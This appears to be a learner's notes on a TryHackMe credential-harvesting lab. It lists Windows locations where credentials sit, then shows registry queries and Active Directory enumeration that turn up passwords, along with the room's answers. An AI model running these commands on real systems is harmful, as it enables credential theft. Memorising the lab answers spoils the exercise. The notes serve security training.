# Credharvesting
- After gaining access to a system we need to find creds.

## Credentials are stored insecurely in various locations in systems:
-   Clear-text files
 -   Database files
 -   Memory
 -   Password managers
 -   Enterprise Vaults
 -   Active Directory
 -   Network Sniffing

## The following are some of the types of clear-text files that an attacker may be interested in:
- Commands history
-  Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code 

## As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
    C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 

    
## Searching for the "password" keyword in the Registry        
- c:\Users\user> reg query HKLM /f password /t REG_SZ /s
- C:\Users\user> reg query HKCU /f password /t REG_SZ /s

Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
## (Task 3)Use findstr to grep THM text only

```
PS C:\Users\thm> reg query HKLM /f password /t REG_SZ /s | findstr flag
  flag    REG_SZ    password: 7tyh4ckm3
```    

## (Task 3)Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

```
PS C:\Users\thm> Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

Name          SamAccountName Description
----          -------------- -----------
Administrator Administrator  Built-in account for administering the computer/domain
Guest         Guest          Built-in account for guest access to the computer/domain
krbtgt        krbtgt         Key Distribution Center Service Account
THM User      thm
THM Victim    victim         Change the password: Passw0rd!@#
thm-local     thm-local
Admin THM     admin
svc-thm       svc-thm
THM Admin BK  bk-admin
test          test-user
sshd          sshd
```

